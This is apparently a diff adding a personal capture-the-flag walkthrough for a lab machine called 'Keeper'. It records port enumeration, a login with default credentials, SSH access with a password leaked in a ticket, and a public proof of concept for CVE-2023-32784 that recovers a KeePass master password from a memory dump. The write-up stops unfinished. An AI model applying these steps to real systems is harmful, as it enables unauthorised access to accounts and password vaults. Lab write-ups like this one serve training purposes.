@@ -1,0 +1,65 @@
+Keeper Lab:
+
+Enumeration:
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   256 35:39:d4:39:40:4b:1f:61:86:dd:7c:37:bb:4b:98:9e (ECDSA)
+|_  256 1a:e9:72:be:8b:b1:05:d5:ef:fe:dd:80:d8:ef:c0:66 (ED25519)
+80/tcp open  http    nginx 1.18.0 (Ubuntu)
+|_http-title: Site doesn't have a title (text/html).
+|_http-server-header: nginx/1.18.0 (Ubuntu)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+There’s a webserver, let’s see if there are any directories using gobuster:
+There are no directories showing up
+
+The website leads us to another link, we gotta resolve the name first
+echo “10.129.253.5 tickets.keeper.htb keeper.htb” | sudo tee -a /etc/hosts
+
+I was able to login to tickets.keeper.htb, they use default credentials still
+User: root
+Password: password
+
+We were able to login, and we found an open ticket about another user. In the comments of the ticket, it seems they put their initial password as: Welcome2023!
+
+Let’s test an SSH connection now
+ssh lnorgaard@10.129.89.109
+
+While in the SSH session, let’s take the zip back to our desktop
+scp lnorgaard@10.129.89.109:/home/lnorgaard/RT30000.zip  .
+
+User flag is in the directory, but there is also a zip file “RT30000.zip”
+unzip RT3000.zip
+
+There are two files, KeePassDumpFull.dmp and passcodes.kdbx
+
+We can use this CVE-2023-32784 https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-32784 
+
+We also found a github for proof of concept: https://github.com/vdohney/keepass-password-dumper 
+
+While in the SSH session, let’s take the zip back to our desktop
+scp lnorgaard@10.129.89.109:/home/lnorgaard/RT30000.zip  .
+
+Using the github and the instructions above:
+git clone https://github.com/vdohney/keepass-password-dumper
+cd keepass-password-dumper/
+
+
+dotnet run ../KeePassDumpFull.dmp ../passcodes.kdbx 
+
+Output: 
+Combined: ●{ø, Ï, ,, l, `, -, ', ], §, A, I, :, =, _, c, M}dgrød med fløde
+16 possible passwords saved in ../passcodes.kdbx. Unknown characters indicated as ●
+
+
+Now, we need something to interact with the KeePass database
+sudo apt-get install kpcli -y
+
+We ran into issues with installation as we have unmet dependencies, it requires “perlapi.5.36.0”
+sudo apt-get update
+sudo apt-get upgrade
+
+The above did not work, let’s try using aptitude, it is often better at resolving dependencies than apt-get.
+
+Nothing seems to be working, stopping here. We only got the user flag for now.
